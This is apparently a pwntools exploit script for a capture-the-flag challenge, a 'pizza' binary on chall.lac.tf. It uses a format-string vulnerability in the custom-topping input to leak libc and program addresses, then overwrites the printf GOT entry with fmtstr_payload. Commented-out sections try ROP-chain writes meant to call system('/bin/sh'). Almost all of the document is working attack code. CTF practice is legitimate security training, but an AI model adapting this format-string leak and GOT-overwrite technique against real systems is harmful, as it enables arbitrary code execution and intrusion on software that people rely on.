from pwn import *

exe = ELF('./pizza_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

# b *main+529
io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+634
        continue
    """)
elif args.REMOTE:
    io = remote("chall.lac.tf", "31134")

def send_custom_topping(custom_topping):
    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', custom_topping)

# ********************************************
# libc leak
# ********************************************

# それっぽいの出力している場所を探す
payload = ''.join([f'%{i}$p,' for i in range(47, 52)]).encode()
send_custom_topping(payload)
for _ in range(2):
    send_custom_topping(b'X')

io.recvline()
address = io.recvline().decode().split(',')
libc_start_call_main_address = int(address[0], 16) - 128 + 182
main_address = int(address[2], 16)
rbp_address = int(address[4], 16) - 280

libc.address = libc_start_call_main_address - libc.symbols.__libc_start_main
exe.address = main_address - exe.symbols.main
print(f'{hex(libc_start_call_main_address) = }')
print(f'{hex(main_address) = }')
print(f'{hex(rbp_address) = }')
print(f'{hex(exe.got.printf) = }')
print(f'{hex(exe.got.puts) = }')

io.sendlineafter(b'(y/n):', b'y')

# # ********************************************
# # ROP
# # ********************************************
# rop = ROP(exe)
# rop.raw(rop.find_gadget(['ret']))
# print(f'{rop.chain().hex() = }')

# ret_addr = rbp_address + 8
# writes = {ret_addr: rop.chain()}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# # payload = b'/bin/sh\x00' + payload
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'y')

# writes = {ret_addr + 8: libc.symbols.system}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# # payload = b'/bin/sh\x00' + payload
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'y')

# # ret_addr = rbp_address + 8
# # writes = {ret_addr: libc.symbols.system}
# # offset = 6
# # payload = fmtstr_payload(offset, writes, write_size='short')
# # # payload = b'/bin/sh\x00' + payload
# # print(len(payload))
# # send_custom_topping(payload)
# # send_custom_topping(b'/bin/sh')
# # send_custom_topping(b'X')
# # io.sendlineafter(b'(y/n):', b'y')

# rdi_addr = rbp_address - 1664
# print(f'{hex(rdi_addr) = }')
# writes = {rdi_addr: b'/bin/sh\x00'}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'n')


# ********************************************
# got overwrite
# ********************************************

# for i in range(10):
#     print(i)
#     payload = f'AAAAAA%{i}$p'.encode()
#     # payload = ''.join([f'A%{i}$p,' for i in range(15, 30)]).encode()
#     # payload = ''.join([f'A%{i}$p,' for i in range(30, 45)]).encode()
#     send_custom_topping(payload)
#     for _ in range(2):
#         send_custom_topping(b'X')
#     io.recvline()
#     print(io.recvline())
#     io.sendlineafter(b':', b'y')


# writes = {exe.got.printf: libc.symbols.system}
writes = {exe.got.printf: libc.symbols.printf}
# writes = {exe.got.printf: libc.symbols.puts}
offset = 6
payload = fmtstr_payload(offset, writes, write_size='short')
print(len(payload))
send_custom_topping(payload)
send_custom_topping(b'/bin/sh')
send_custom_topping(b'X')

io.interactive()
